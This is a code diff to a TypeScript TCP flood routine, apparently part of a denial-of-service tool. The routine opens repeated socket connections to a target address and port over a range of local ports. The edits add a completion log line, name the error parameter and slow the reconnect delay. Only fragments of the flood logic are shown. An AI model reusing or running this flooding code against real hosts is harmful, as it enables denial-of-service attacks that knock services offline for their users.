@@ -1,6 +1,6 @@
 import { Socket } from 'net';
 
-const attackDuration = 30000;
+const attackDuration = 30000; 
 
 export async function tcpFlood (ip: string, port: number, localPorts: [number, number]): Promise<void> {
   console.log(`starting tcp flood ${ip}:${port} using localPorts ${localPorts[0]}-${localPorts[1]}`);
@@ -11,6 +11,7 @@ export async function tcpFlood (ip: string, port: number, localPorts: [number, n
   }
 
   await Promise.all(promises);
+  console.log(`finished tcp flood ${ip}:${port} using localPorts ${localPorts[0]}-${localPorts[1]}`);
 }
 
 async function connectTCP (ip: string, port: number, localPort: number): Promise<void> {
@@ -27,7 +28,7 @@ async function connectTCP (ip: string, port: number, localPort: number): Promise
       try {
         let client = new Socket();
 
-        client.on('error', () => {
+        client.on('error', (error) => {
           // swallow error and just try again after short timeout
           return;
         });
@@ -35,7 +36,7 @@ async function connectTCP (ip: string, port: number, localPort: number): Promise
         client.on('close', () => {
           // this also happens when an error occurs
           // just try again after a short delay
-          setTimeout(tcpRequest, 100);
+          setTimeout(tcpRequest, 1000);
         });
 
         client.connect({
